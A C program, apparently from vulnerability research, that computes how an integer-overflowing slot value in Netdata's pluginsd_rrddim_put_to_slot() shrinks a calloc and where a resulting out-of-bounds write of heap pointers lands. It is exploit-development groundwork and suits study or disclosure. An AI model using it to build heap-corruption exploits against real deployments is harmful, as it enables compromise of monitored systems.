// Determine whether the overflow slot also yields a *targeted* controlled-pointer
// write via &entries[slot-1] in pluginsd_rrddim_put_to_slot().
//
// alloc_bytes(slot) = 16 + slot*24   (mod 2^64)         -> calloc size
// entry_ptr(slot)   = entries_base + (slot-1)*24 (mod 2^64)
//   where entries_base = arr + 16
// So entry_ptr - arr = 16 + (slot-1)*24 = 16 + slot*24 - 24 = alloc_bytes - 24 (mod 2^64)
//
// We want alloc_bytes small (tiny calloc) AND entry offset relative to arr to be
// a small signed value (write near the chunk -> smashes chunk metadata / adjacent
// object) with attacker-controlled real heap pointers (prd->rda/rd/id).
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

int main(void){
    const uint64_t E = 24;     // sizeof(struct pluginsd_rrddim)
    const uint64_t H = 16;     // sizeof(PRD_ARRAY)
    printf("slot                          alloc_bytes  entry_off_from_arr  entry_off_from_entries\n");
    // base = floor(2^64/24)
    unsigned __int128 two64 = (unsigned __int128)1 << 64;
    uint64_t base = (uint64_t)(two64 / E);
    for(int64_t d = -2; d <= 6; d++){
        uint64_t slot = base + d;
        if((int64_t)slot < 1) continue;
        uint64_t alloc = H + slot*E;                  // wraps mod 2^64
        uint64_t entry_off_arr = H + (slot-1)*E;      // &entries[slot-1] - arr (mod 2^64)
        int64_t  signed_entry_off = (int64_t)entry_off_arr;
        uint64_t entry_off_entries = (slot-1)*E;      // - entries_base
        int64_t  signed_eoe = (int64_t)entry_off_entries;
        printf("0x%016llx  %10llu   %+18lld   %+18lld\n",
               (unsigned long long)slot,
               (unsigned long long)alloc,
               (long long)signed_entry_off,
               (long long)signed_eoe);
    }
    printf("\nInterpretation: entry write lands 'entry_off_from_arr' bytes from the\n");
    printf("start of the undersized chunk. Small negative/positive offsets => the\n");
    printf("write of prd->rda/prd->rd/prd->id (REAL heap pointers) hits chunk\n");
    printf("metadata / adjacent objects with attacker-influenced values.\n");
    return 0;
}
